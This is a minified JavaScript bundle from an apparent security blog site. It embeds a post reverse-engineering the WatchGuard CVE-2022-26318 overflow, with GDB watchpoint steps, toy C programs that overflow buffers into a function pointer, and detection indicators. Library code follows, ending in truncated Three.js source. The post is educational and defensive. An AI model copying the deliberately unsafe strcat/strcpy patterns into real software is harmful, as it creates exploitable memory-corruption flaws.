    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,Db={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:Tb},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:Pb},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:kb},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:Nb},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:Lb},1001:{title:"CVE-2024–1001",slug:"1001",content:Sb},"0012":{title:"CVE-2024–0012",slug:"0012",content:xb},40982:{title:"CVE-2022–40982",slug:"40982",content:Mb},cow:{title:"CVE-2016–5195",slug:"cow",content:Eb},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:Rb},23397:{title:"CVE-2023–23397",slug:"23397",content:wb},"0160":{title:"CVE-2014-0160",slug:"0160",content:yb},11882:{title:"CVE-2017-11882",slug:"11882",content:bb},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:Cb},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:Ab}};function Ib(t){try{const n=new DOMParser().parseFromString(t,"text/html"),i=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];n.querySelectorAll(i.join(",")).forEach(o=>o.remove()),n.querySelectorAll("[style]").forEach(o=>o.removeAttribute("style"));const s=n.querySelector("h1");s&&s.remove();const r=[".blog-text","article",".blog-post-content","main"];let a=n.body;for(const o of r){const l=n.querySelector(o);if(l){a=l;break}}return a.querySelectorAll(".container").forEach(o=>{for(;o.firstChild;)o.parentNode.insertBefore(o.firstChild,o);o.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((o,l)=>{o.id||(o.id=`section-${l+1}`)}),a.innerHTML||t}catch{return t}}function Ub(){const{slug:t}=PS(),e=Db[t],n=Ga.find(r=>r.slug===t),i=ee.useMemo(()=>e?Ib(e.content):"",[e]),s=()=>document.body.classList.contains("dark")?"dark":"light";return ee.useEffect(()=>{const r=document.querySelector(".giscus-container");if(!r)return;r.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",s()),r.appendChild(a),()=>{r.innerHTML=""}},[t]),ee.useEffect(()=>{const r=()=>{var l;const o=document.querySelector("iframe.giscus-frame");o&&((l=o.contentWindow)==null||l.postMessage({giscus:{setConfig:{theme:s()}}},"https://giscus.app"))},a=new MutationObserver(r);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),r(),()=>a.disconnect()},[]),e?M.jsxs(M.Fragment,{children:[M.jsx("header",{className:"blog-post-header",children:M.jsxs("div",{className:"container text-center",children:[M.jsx("h1",{className:"blog-post-title",children:e.title}),n&&M.jsxs("p",{className:"blog-post-date",children:[n.date," · ",n.readTime]})]})}),M.jsxs("main",{className:"section blog-post-content container",children:[M.jsx("article",{dangerouslySetInnerHTML:{__html:i}}),M.jsx("section",{className:"comments",children:M.jsx("div",{className:"container",children:M.jsx("div",{className:"giscus-container"})})})]})]}):M.jsxs("main",{className:"section blog-post-content container",children:[M.jsx("h2",{children:"Post not found"}),M.jsx("p",{children:"Signal lost. Let’s go back."}),M.jsx(zt,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function Ob(){return M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsx("div",{className:"section-header",children:M.jsxs("div",{children:[M.jsx("div",{className:"eyebrow",children:"Featured work"}),M.jsx("h2",{className:"section-title",children:"Projects"}),M.jsx("p",{className:"section-subtitle",children:"Deployment dossiers and offensive prototypes."})]})}),M.jsx(C0,{items:w0,showHeader:!1,showViewAll:!1,showFilters:!0,showFeatured:!0,wrap:!1})]})})}function Fb(){return M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsx("div",{className:"section-header",children:M.jsxs("div",{children:[M.jsx("div",{className:"eyebrow",children:"Recognitions"}),M.jsx("h2",{className:"section-title",children:"Certifications"}),M.jsx("p",{className:"section-subtitle",children:"Professional credentials across security, cloud, and networking."})]})}),M.jsx(A0,{items:M0,showHeader:!1,wrap:!1})]})})}/**
 * @license
 * Copyright 2010-2025 Three.js Authors
 * SPDX-License-Identifier: MIT
 */const rh="182",Bb=0,$f=1,zb=2,ol=1,Vb=2,ha=3,cs=0,mn=1,xi=2,Ei=0,Er=1,Kf=2,Zf=3,Jf=4,Hb=5,Es=100,Gb=101,Wb=102,jb=103,Xb=104,qb=200,Yb=201,$b=202,Kb=203,md=204,gd=205,Zb=206,Jb=207,Qb=208,ew=209,tw=210,nw=211,iw=212,sw=213,rw=214,vd=0,_d=1,xd=2,Dr=3,yd=4,Sd=5,bd=6,wd=7,R0=0,aw=1,ow=2,ri=0,P0=1,L0=2,k0=3,N0=4,D0=5,I0=6,U0=7,O0=300,zs=301,Ir=302,Md=303,Ed=304,ac=306,Wa=1e3,bi=1001,Td=1002,Vt=1003,lw=1004,Ao=1005,Kt=1006,zc=1007,Ps=1008,Sn=1009,F0=1010,B0=1011,ja=1012,ah=1013,li=1014,ti=1015,Li=1016,oh=1017,lh=1018,Xa=1020,z0=35902,V0=35899,H0=1021,G0=1022,jn=1023,ki=1026,Ls=1027,W0=1028,ch=1029,Ur=1030,uh=1031,dh=1033,ll=33776,cl=33777,ul=33778,dl=33779,Ad=35840,Cd=35841,Rd=35842,Pd=35843,Ld=36196,kd=37492,Nd=37496,Dd=37488,Id=37489,Ud=37490,Od=37491,Fd=37808,Bd=37809,zd=37810,Vd=37811,Hd=37812,Gd=37813,Wd=37814,jd=37815,Xd=37816,qd=37817,Yd=37818,$d=37819,Kd=37820,Zd=37821,Jd=36492,Qd=36494,ep=36495,tp=36283,np=36284,ip=36285,sp=36286,cw=3200,j0=0,uw=1,qi="",Pn="srgb",Or="srgb-linear",Fl="linear",st="srgb",Xs=7680,Qf=519,dw=512,pw=513,hw=514,ph=515,fw=516,mw=517,hh=518,gw=519,em=35044,tm="300 es",ni=2e3,Bl=2001;function X0(t){for(let e=t.length-1;e>=0;--e)if(t[e]>=65535)return!0;return!1}function zl(t){return document.createElementNS("http://www.w3.org/1999/xhtml",t)}function vw(){const t=zl("canvas");return t.style.display="block",t}const nm={};function im(...t){const e="THREE."+t.shift();console.log(e,...t)}function Ne(...t){const e="THREE."+t.shift();console.warn(e,...t)}function Qe(...t){const e="THREE."+t.shift();console.error(e,...t)}function qa(...t){const e=t.join(" ");e in nm||(nm[e]=!0,Ne(...t))}function _w(t,e,n){return new Promise(function(i,s){function r(){switch(t.clientWaitSync(e,t.SYNC_FLUSH_COMMANDS_BIT,0)){case t.WAIT_FAILED:s();break;case t.TIMEOUT_EXPIRED:setTimeout(r,n);break;default:i()}}setTimeout(r,n)})}class Gr{addEventListener(e,n){this._listeners===void 0&&(this._listeners={});const i=this._listeners;i[e]===void 0&&(i[e]=[]),i[e].indexOf(n)===-1&&i[e].push(n)}hasEventListener(e,n){const i=this._listeners;return i===void 0?!1:i[e]!==void 0&&i[e].indexOf(n)!==-1}removeEventListener(e,n){const i=this._listeners;if(i===void 0)return;const s=i[e];if(s!==void 0){const r=s.indexOf(n);r!==-1&&s.splice(r,1)}}dispatchEvent(e){const n=this._listeners;if(n===void 0)return;const i=n[e.type];if(i!==void 0){e.target=this;const s=i.slice(0);for(let r=0,a=s.length;r<a;r++)s[r].call(this,e);e.target=null}}}const qt=["00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"],Vc=Math.PI/180,rp=180/Math.PI;function io(){const t=Math.random()*4294967295|0,e=Math.random()*4294967295|0,n=Math.random()*4294967295|0,i=Math.random()*4294967295|0;return(qt[t&255]+qt[t>>8&255]+qt[t>>16&255]+qt[t>>24&255]+"-"+qt[e&255]+qt[e>>8&255]+"-"+qt[e>>16&15|64]+qt[e>>24&255]+"-"+qt[n&63|128]+qt[n>>8&255]+"-"+qt[n>>16&255]+qt[n>>24&255]+qt[i&255]+qt[i>>8&255]+qt[i>>16&255]+qt[i>>24&255]).toLowerCase()}function je(t,e,n){return Math.max(e,Math.min(n,t))}function xw(t,e){return(t%e+e)%e}function Hc(t,e,n){return(1-n)*t+n*e}function ta(t,e){switch(e.constructor){case Float32Array:return t;case Uint32Array:return t/4294967295;case Uint16Array:return t/65535;case Uint8Array:return t/255;case Int32Array:return Math.max(t/2147483647,-1);case Int16Array:return Math.max(t/32767,-1);case Int8Array:return Math.max(t/127,-1);default:throw new Error("Invalid component type.")}}function ln(t,e){switch(e.constructor){case Float32Array:return t;case Uint32Array:return Math.round(t*4294967295);case Uint16Array:return Math.round(t*65535);case Uint8Array:return Math.round(t*255);case Int32Array:return Math.round(t*2147483647);case Int16Array:return Math.round(t*32767);case Int8Array:return Math.round(t*127);default:throw new Error("Invalid component type.")}}class et{constructor(e=0,n=0){et.prototype.isVector2=!0,this.x=e,this.y=n}get width(){return this.x}set width(e){this.x=e}get height(){return this.y}set height(e){this.y=e}set(e,n){return this.x=e,this.y=n,this}setScalar(e){return this.x=e,this.y=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y)}copy(e){return this.x=e.x,this.y=e.y,this}add(e){return this.x+=e.x,this.y+=e.y,this}addScalar(e){return this.x+=e,this.y+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this}subScalar(e){return this.x-=e,this.y-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this}multiply(e){return this.x*=e.x,this.y*=e.y,this}multiplyScalar(e){return this.x*=e,this.y*=e,this}divide(e){return this.x/=e.x,this.y/=e.y,this}divideScalar(e){return this.multiplyScalar(1/e)}applyMatrix3(e){const n=this.x,i=this.y,s=e.elements;return this.x=s[0]*n+s[3]*i+s[6],this.y=s[1]*n+s[4]*i+s[7],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this}clamp(e,n){return this.x=je(this.x,e.x,n.x),this.y=je(this.y,e.y,n.y),this}clampScalar(e,n){return this.x=je(this.x,e,n),this.y=je(this.y,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(je(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this}negate(){return this.x=-this.x,this.y=-this.y,this}dot(e){return this.x*e.x+this.y*e.y}cross(e){return this.x*e.y-this.y*e.x}lengthSq(){return this.x*this.x+this.y*this.y}length(){return Math.sqrt(this.x*this.x+this.y*this.y)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)}normalize(){return this.divideScalar(this.length()||1)}angle(){return Math.atan2(-this.y,-this.x)+Math.PI}angleTo(e){const n=Math.sqrt(this.lengthSq()*e.lengthSq());if(n===0)return Math.PI/2;const i=this.dot(e)/n;return Math.acos(je(i,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const n=this.x-e.x,i=this.y-e.y;return n*n+i*i}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this}equals(e){return e.x===this.x&&e.y===this.y}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this}rotateAround(e,n){const i=Math.cos(n),s=Math.sin(n),r=this.x-e.x,a=this.y-e.y;return this.x=r*i-a*s+e.x,this.y=r*s+a*i+e.y,this}random(){return this.x=Math.random(),this.y=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y}}class so{constructor(e=0,n=0,i=0,s=1){this.isQuaternion=!0,this._x=e,this._y=n,this._z=i,this._w=s}static slerpFlat(e,n,i,s,r,a,o){let l=i[s+0],c=i[s+1],d=i[s+2],p=i[s+3],h=r[a+0],f=r[a+1],_=r[a+2],y=r[a+3];if(o<=0){e[n+0]=l,e[n+1]=c,e[n+2]=d,e[n+3]=p;return}if(o>=1){e[n+0]=h,e[n+1]=f,e[n+2]=_,e[n+3]=y;return}if(p!==y||l!==h||c!==f||d!==_){let m=l*h+c*f+d*_+p*y;m<0&&(h=-h,f=-f,_=-_,y=-y,m=-m);let u=1-o;if(m<.9995){const g=Math.acos(m),x=Math.sin(g);u=Math.sin(u*g)/x,o=Math.sin(o*g)/x,l=l*u+h*o,c=c*u+f*o,d=d*u+_*o,p=p*u+y*o}else{l=l*u+h*o,c=c*u+f*o,d=d*u+_*o,p=p*u+y*o;const g=1/Math.sqrt(l*l+c*c+d*d+p*p);l*=g,c*=g,d*=g,p*=g}}e[n]=l,e[n+1]=c,e[n+2]=d,e[n+3]=p}static multiplyQuaternionsFlat(e,n,i,s,r,a){const o=i[s],l=i[s+1],c=i[s+2],d=i[s+3],p=r[a],h=r[a+1],f=r[a+2],_=r[a+3];return e[n]=o*_+d*p+l*f-c*h,e[n+1]=l*_+d*h+c*p-o*f,e[n+2]=c*_+d*f+o*h-l*p,e[n+3]=d*_-o*p-l*h-c*f,e}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get w(){return this._w}set w(e){this._w=e,this._onChangeCallback()}set(e,n,i,s){return this._x=e,this._y=n,this._z=i,this._w=s,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._w)}copy(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this}setFromEuler(e,n=!0){const i=e._x,s=e._y,r=e._z,a=e._order,o=Math.cos,l=Math.sin,c=o(i/2),d=o(s/2),p=o(r/2),h=l(i/2),f=l(s/2),_=l(r/2);switch(a){case"XYZ":this._x=h*d*p+c*f*_,this._y=c*f*p-h*d*_,this._z=c*d*_+h*f*p,this._w=c*d*p-h*f*_;break;case"YXZ":this._x=h*d*p+c*f*_,this._y=c*f*p-h*d*_,this._z=c*d*_-h*f*p,this._w=c*d*p+h*f*_;break;case"ZXY":this._x=h*d*p-c*f*_,this._y=c*f*p+h*d*_,this._z=c*d*_+h*f*p,this._w=c*d*p-h*f*_;break;case"ZYX":this._x=h*d*p-c*f*_,this._y=c*f*p+h*d*_,this._z=c*d*_-h*f*p,this._w=c*d*p+h*f*_;break;case"YZX":this._x=h*d*p+c*f*_,this._y=c*f*p+h*d*_,this._z=c*d*_-h*f*p,this._w=c*d*p-h*f*_;break;case"XZY":this._x=h*d*p-c*f*_,this._y=c*f*p-h*d*_,this._z=c*d*_+h*f*p,this._w=c*d*p+h*f*_;break;default:Ne("Quaternion: .setFromEuler() encountered an unknown order: "+a)}return n===!0&&this._onChangeCallback(),this}setFromAxisAngle(e,n){const i=n/2,s=Math.sin(i);return this._x=e.x*s,this._y=e.y*s,this._z=e.z*s,this._w=Math.cos(i),this._onChangeCallback(),this}setFromRotationMatrix(e){const n=e.elements,i=n[0],s=n[4],r=n[8],a=n[1],o=n[5],l=n[9],c=n[2],d=n[6],p=n[10],h=i+o+p;if(h>0){const f=.5/Math.sqrt(h+1);this._w=.25/f,this._x=(d-l)*f,this._y=(r-c)*f,this._z=(a-s)*f}else if(i>o&&i>p){const f=2*Math.sqrt(1+i-o-p);this._w=(d-l)/f,this._x=.25*f,this._y=(s+a)/f,this._z=(r+c)/f}else if(o>p){const f=2*Math.sqrt(1+o-i-p);this._w=(r-c)/f,this._x=(s+a)/f,this._y=.25*f,this._z=(l+d)/f}else{const f=2*Math.sqrt(1+p-i-o);this._w=(a-s)/f,this._x=(r+c)/f,this._y=(l+d)/f,this._z=.25*f}return this._onChangeCallback(),this}setFromUnitVectors(e,n){let i=e.dot(n)+1;return i<1e-8?(i=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0,this._w=i):(this._x=0,this._y=-e.z,this._z=e.y,this._w=i)):(this._x=e.y*n.z-e.z*n.y,this._y=e.z*n.x-e.x*n.z,this._z=e.x*n.y-e.y*n.x,this._w=i),this.normalize()}angleTo(e){return 2*Math.acos(Math.abs(je(this.dot(e),-1,1)))}rotateTowards(e,n){const i=this.angleTo(e);if(i===0)return this;const s=Math.min(1,n/i);return this.slerp(e,s),this}identity(){return this.set(0,0,0,1)}invert(){return this.conjugate()}conjugate(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}dot(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w}lengthSq(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}length(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}normalize(){let e=this.length();return e===0?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this._onChangeCallback(),this}multiply(e){return this.multiplyQuaternions(this,e)}premultiply(e){return this.multiplyQuaternions(e,this)}multiplyQuaternions(e,n){const i=e._x,s=e._y,r=e._z,a=e._w,o=n._x,l=n._y,c=n._z,d=n._w;return this._x=i*d+a*o+s*c-r*l,this._y=s*d+a*l+r*o-i*c,this._z=r*d+a*c+i*l-s*o,this._w=a*d-i*o-s*l-r*c,this._onChangeCallback(),this}slerp(e,n){if(n<=0)return this;if(n>=1)return this.copy(e);let i=e._x,s=e._y,r=e._z,a=e._w,o=this.dot(e);o<0&&(i=-i,s=-s,r=-r,a=-a,o=-o);let l=1-n;if(o<.9995){const c=Math.acos(o),d=Math.sin(c);l=Math.sin(l*c)/d,n=Math.sin(n*c)/d,this._x=this._x*l+i*n,this._y=this._y*l+s*n,this._z=this._z*l+r*n,this._w=this._w*l+a*n,this._onChangeCallback()}else this._x=this._x*l+i*n,this._y=this._y*l+s*n,this._z=this._z*l+r*n,this._w=this._w*l+a*n,this.normalize();return this}slerpQuaternions(e,n,i){return this.copy(e).slerp(n,i)}random(){const e=2*Math.PI*Math.random(),n=2*Math.PI*Math.random(),i=Math.random(),s=Math.sqrt(1-i),r=Math.sqrt(i);return this.set(s*Math.sin(e),s*Math.cos(e),r*Math.sin(n),r*Math.cos(n))}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w}fromArray(e,n=0){return this._x=e[n],this._y=e[n+1],this._z=e[n+2],this._w=e[n+3],this._onChangeCallback(),this}toArray(e=[],n=0){return e[n]=this._x,e[n+1]=this._y,e[n+2]=this._z,e[n+3]=this._w,e}fromBufferAttribute(e,n){return this._x=e.getX(n),this._y=e.getY(n),this._z=e.getZ(n),this._w=e.getW(n),this._onChangeCallback(),this}toJSON(){return this.toArray()}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._w}}class B{constructor(e=0,n=0,i=0){B.prototype.isVector3=!0,this.x=e,this.y=n,this.z=i}set(e,n,i){return i===void 0&&(i=this.z),this.x=e,this.y=n,this.z=i,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;case 2:this.z=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this.z=e.z+n.z,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this.z+=e.z*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this.z=e.z-n.z,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this}multiplyVectors(e,n){return this.x=e.x*n.x,this.y=e.y*n.y,this.z=e.z*n.z,this}applyEuler(e){return this.applyQuaternion(sm.setFromEuler(e))}applyAxisAngle(e,n){return this.applyQuaternion(sm.setFromAxisAngle(e,n))}applyMatrix3(e){const n=this.x,i=this.y,s=this.z,r=e.elements;return this.x=r[0]*n+r[3]*i+r[6]*s,this.y=r[1]*n+r[4]*i+r[7]*s,this.z=r[2]*n+r[5]*i+r[8]*s,this}applyNormalMatrix(e){return 